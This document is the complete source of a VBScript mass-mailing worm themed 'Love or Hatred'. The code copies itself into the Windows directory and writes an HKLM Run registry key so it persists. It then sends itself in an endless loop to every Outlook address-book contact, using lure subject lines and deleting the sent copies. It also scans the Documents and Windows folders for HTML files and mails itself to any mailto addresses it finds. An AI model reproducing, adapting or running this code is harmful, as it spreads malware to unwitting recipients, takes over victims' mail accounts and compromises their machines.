   On Error Resume Next

   Set fso=CreateObject("Scripting.FileSystemObject")
   Set ws=CreateObject("WScript.Shell")

   orig=WScript.ScriptFullName
   fcopy=fso.GetSpecialFolder(0) & "\LoveVSHatred.vbs"

   Call Copy(orig,fcopy)

   If orig=fcopy Then
   list(ws.SpecialFolders("MyDocuments"))
   list(fso.GetSpecialFolder(0))

   Do
   Set out=CreateObject("Outlook.Application")
   Set map=out.GetNameSpace("MAPI")
   For each c In map.AddressLists
   If c.AddressEntries.Count <> 0 Then
   For d = 1 To c.AddressEntries.Count
   Set wpalr = out.CreateItem(0)
   wpalr.To = c.AddressEntries(d).Address
   wpalr.Subject = "Love or Hatred"
   wpalr.Body = "Open this file and choice..."
   wpalr.Attachments.Add(WScript.ScriptFullName)
   wpalr.DeleteAfterSubmit = True
   If wpalr.To <> "" Then
   wpalr.Send
   End If
   Next
   End If
   Next
   Loop

   End If

   Sub Copy(src,dst)
   fso.CopyFile orig,fcopy
   ws.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\Run\LVSH",fcopy
   End Sub

   Sub list(dir)
   For Each f1 In fso.GetFolder(dir).SubFolders
   infect(f1.Path)
   list(f1.Path)
   Next
   End Sub

   Sub infect(dir)
   For Each fil In fso.GetFolder(dir).Files
   ext = fso.GetExtensionName(fil.Path)
   ext = lCase(ext)
   If (ext = "htm") or (ext = "html") Then
   Set h=fso.OpenTextFile(fil.Path,1)
   scnm=h.ReadAll
   h.Close

   For j = 1 To Len(scnm)
   If Mid(scnm, j, 7) = "mailto:" Then
   mlto = ""
   cnt = 0
   Do While Mid(scnm, j + 7 + cnt, 1) <> """"
   mlto = mlto + Mid(scnm, j + 7 + cnt, 1)
   cnt = cnt + 1
   Loop

   SendMail(mlto)

   End If
   Next

   End If
   Next
   End Sub

   Sub SendMail(email)
   On Error Resume Next
   Dim out
   Set out = CreateObject("Outlook.Application")
   Set mel = out.CreateItem(0)
   mel.To = email
   mel.Subject = "Love or Hatred ??"
   mel.Body = "Open this attached file and you will know if you have the love or the hatred"
   mel.Attachments.Add(WScript.ScriptFullName)
   mel.Attachments.Add (WScript.ScriptFullName)
   mel.Send
   Set out = Nothing
   End Sub
